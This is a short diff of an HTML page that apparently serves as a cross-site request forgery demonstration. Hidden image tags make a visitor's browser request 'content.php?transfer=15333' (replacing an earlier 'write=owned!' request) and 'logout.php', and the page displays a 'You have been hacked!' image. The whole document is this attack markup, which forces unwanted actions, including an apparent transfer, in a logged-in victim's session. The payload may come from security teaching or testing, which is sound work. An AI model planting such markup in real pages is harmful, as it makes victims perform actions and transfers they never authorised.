@@ -1,4 +1,4 @@
-<img src="content.php?write=owned!">
+<img src="content.php?transfer=15333">
 <img src="logout.php">
 <img src="maxresdefault.jpg" alt="You have been hacked!" height="400" width="800">
 <br />
